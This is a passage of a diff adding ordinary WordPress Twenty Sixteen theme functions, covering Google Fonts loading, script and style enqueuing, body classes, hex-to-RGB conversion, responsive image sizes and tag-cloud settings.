+ *
+ * @since Twenty Sixteen 1.0
+ *
+ * @return string Google fonts URL for the theme.
+ */
+function twentysixteen_fonts_url() {
+	$fonts_url = '';
+	$fonts     = array();
+	$subsets   = 'latin,latin-ext';
+
+	/* translators: If there are characters in your language that are not supported by Merriweather, translate this to 'off'. Do not translate into your own language. */
+	if ( 'off' !== _x( 'on', 'Merriweather font: on or off', 'twentysixteen' ) ) {
+		$fonts[] = 'Merriweather:400,700,900,400italic,700italic,900italic';
+	}
+
+	/* translators: If there are characters in your language that are not supported by Montserrat, translate this to 'off'. Do not translate into your own language. */
+	if ( 'off' !== _x( 'on', 'Montserrat font: on or off', 'twentysixteen' ) ) {
+		$fonts[] = 'Montserrat:400,700';
+	}
+
+	/* translators: If there are characters in your language that are not supported by Inconsolata, translate this to 'off'. Do not translate into your own language. */
+	if ( 'off' !== _x( 'on', 'Inconsolata font: on or off', 'twentysixteen' ) ) {
+		$fonts[] = 'Inconsolata:400';
+	}
+
+	if ( $fonts ) {
+		$fonts_url = add_query_arg( array(
+			'family' => urlencode( implode( '|', $fonts ) ),
+			'subset' => urlencode( $subsets ),
+		), 'https://fonts.googleapis.com/css' );
+	}
+
+	return $fonts_url;
+}
+endif;
+
+/**
+ * Handles JavaScript detection.
+ *
+ * Adds a `js` class to the root `<html>` element when JavaScript is detected.
+ *
+ * @since Twenty Sixteen 1.0
+ */
+function twentysixteen_javascript_detection() {
+	echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
+}
+add_action( 'wp_head', 'twentysixteen_javascript_detection', 0 );
+
+/**
+ * Enqueues scripts and styles.
+ *
+ * @since Twenty Sixteen 1.0
+ */
+function twentysixteen_scripts() {
+	// Add custom fonts, used in the main stylesheet.
+	wp_enqueue_style( 'twentysixteen-fonts', twentysixteen_fonts_url(), array(), null );
+
+	// Add Genericons, used in the main stylesheet.
+	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '3.4.1' );
+
+	// Theme stylesheet.
+	wp_enqueue_style( 'twentysixteen-style', get_stylesheet_uri() );
+
+	// Load the Internet Explorer specific stylesheet.
+	wp_enqueue_style( 'twentysixteen-ie', get_template_directory_uri() . '/css/ie.css', array( 'twentysixteen-style' ), '20160816' );
+	wp_style_add_data( 'twentysixteen-ie', 'conditional', 'lt IE 10' );
+
+	// Load the Internet Explorer 8 specific stylesheet.
+	wp_enqueue_style( 'twentysixteen-ie8', get_template_directory_uri() . '/css/ie8.css', array( 'twentysixteen-style' ), '20160816' );
+	wp_style_add_data( 'twentysixteen-ie8', 'conditional', 'lt IE 9' );
+
+	// Load the Internet Explorer 7 specific stylesheet.
+	wp_enqueue_style( 'twentysixteen-ie7', get_template_directory_uri() . '/css/ie7.css', array( 'twentysixteen-style' ), '20160816' );
+	wp_style_add_data( 'twentysixteen-ie7', 'conditional', 'lt IE 8' );
+
+	// Load the html5 shiv.
+	wp_enqueue_script( 'twentysixteen-html5', get_template_directory_uri() . '/js/html5.js', array(), '3.7.3' );
+	wp_script_add_data( 'twentysixteen-html5', 'conditional', 'lt IE 9' );
+
+	wp_enqueue_script( 'twentysixteen-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20160816', true );
+
+	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
+		wp_enqueue_script( 'comment-reply' );
+	}
+
+	if ( is_singular() && wp_attachment_is_image() ) {
+		wp_enqueue_script( 'twentysixteen-keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20160816' );
+	}
+
+	wp_enqueue_script( 'twentysixteen-script', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20160816', true );
+
+	wp_localize_script( 'twentysixteen-script', 'screenReaderText', array(
+		'expand'   => __( 'expand child menu', 'twentysixteen' ),
+		'collapse' => __( 'collapse child menu', 'twentysixteen' ),
+	) );
+}
+add_action( 'wp_enqueue_scripts', 'twentysixteen_scripts' );
+
+/**
+ * Adds custom classes to the array of body classes.
+ *
+ * @since Twenty Sixteen 1.0
+ *
+ * @param array $classes Classes for the body element.
+ * @return array (Maybe) filtered body classes.
+ */
+function twentysixteen_body_classes( $classes ) {
+	// Adds a class of custom-background-image to sites with a custom background image.
+	if ( get_background_image() ) {
+		$classes[] = 'custom-background-image';
+	}
+
+	// Adds a class of group-blog to sites with more than 1 published author.
+	if ( is_multi_author() ) {
+		$classes[] = 'group-blog';
+	}
+
+	// Adds a class of no-sidebar to sites without active sidebar.
+	if ( ! is_active_sidebar( 'sidebar-1' ) ) {
+		$classes[] = 'no-sidebar';
+	}
+
+	// Adds a class of hfeed to non-singular pages.
+	if ( ! is_singular() ) {
+		$classes[] = 'hfeed';
+	}
+
+	return $classes;
+}
+add_filter( 'body_class', 'twentysixteen_body_classes' );
+
+/**
+ * Converts a HEX value to RGB.
+ *
+ * @since Twenty Sixteen 1.0
+ *
+ * @param string $color The original color, in 3- or 6-digit hexadecimal form.
+ * @return array Array containing RGB (red, green, and blue) values for the given
+ *               HEX code, empty array otherwise.
+ */
+function twentysixteen_hex2rgb( $color ) {
+	$color = trim( $color, '#' );
+
+	if ( strlen( $color ) === 3 ) {
+		$r = hexdec( substr( $color, 0, 1 ).substr( $color, 0, 1 ) );
+		$g = hexdec( substr( $color, 1, 1 ).substr( $color, 1, 1 ) );
+		$b = hexdec( substr( $color, 2, 1 ).substr( $color, 2, 1 ) );
+	} else if ( strlen( $color ) === 6 ) {
+		$r = hexdec( substr( $color, 0, 2 ) );
+		$g = hexdec( substr( $color, 2, 2 ) );
+		$b = hexdec( substr( $color, 4, 2 ) );
+	} else {
+		return array();
+	}
+
+	return array( 'red' => $r, 'green' => $g, 'blue' => $b );
+}
+
+/**
+ * Custom template tags for this theme.
+ */
+require get_template_directory() . '/inc/template-tags.php';
+
+/**
+ * Customizer additions.
+ */
+require get_template_directory() . '/inc/customizer.php';
+
+/**
+ * Add custom image sizes attribute to enhance responsive image functionality
+ * for content images
+ *
+ * @since Twenty Sixteen 1.0
+ *
+ * @param string $sizes A source size value for use in a 'sizes' attribute.
+ * @param array  $size  Image size. Accepts an array of width and height
+ *                      values in pixels (in that order).
+ * @return string A source size value for use in a content image 'sizes' attribute.
+ */
+function twentysixteen_content_image_sizes_attr( $sizes, $size ) {
+	$width = $size[0];
+
+	840 <= $width && $sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px';
+
+	if ( 'page' === get_post_type() ) {
+		840 > $width && $sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';
+	} else {
+		840 > $width && 600 <= $width && $sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 61vw, (max-width: 1362px) 45vw, 600px';
+		600 > $width && $sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';
+	}
+
+	return $sizes;
+}
+add_filter( 'wp_calculate_image_sizes', 'twentysixteen_content_image_sizes_attr', 10 , 2 );
+
+/**
+ * Add custom image sizes attribute to enhance responsive image functionality
+ * for post thumbnails
+ *
+ * @since Twenty Sixteen 1.0
+ *
+ * @param array $attr Attributes for the image markup.
+ * @param int   $attachment Image attachment ID.
+ * @param array $size Registered image size or flat array of height and width dimensions.
+ * @return string A source size value for use in a post thumbnail 'sizes' attribute.
+ */
+function twentysixteen_post_thumbnail_sizes_attr( $attr, $attachment, $size ) {
+	if ( 'post-thumbnail' === $size ) {
+		is_active_sidebar( 'sidebar-1' ) && $attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 60vw, (max-width: 1362px) 62vw, 840px';
+		! is_active_sidebar( 'sidebar-1' ) && $attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 88vw, 1200px';
+	}
+	return $attr;
+}
+add_filter( 'wp_get_attachment_image_attributes', 'twentysixteen_post_thumbnail_sizes_attr', 10 , 3 );
+
+/**
+ * Modifies tag cloud widget arguments to have all tags in the widget same font size.
+ *
+ * @since Twenty Sixteen 1.1
+ *
+ * @param array $args Arguments for tag cloud widget.
+ * @return array A new modified arguments.
+ */
+function twentysixteen_widget_tag_cloud_args( $args ) {
+	$args['largest'] = 1;
+	$args['smallest'] = 1;
+	$args['unit'] = 'em';
+	return $args;
+}
+add_filter( 'widget_tag_cloud_args', 'twentysixteen_widget_tag_cloud_args' );
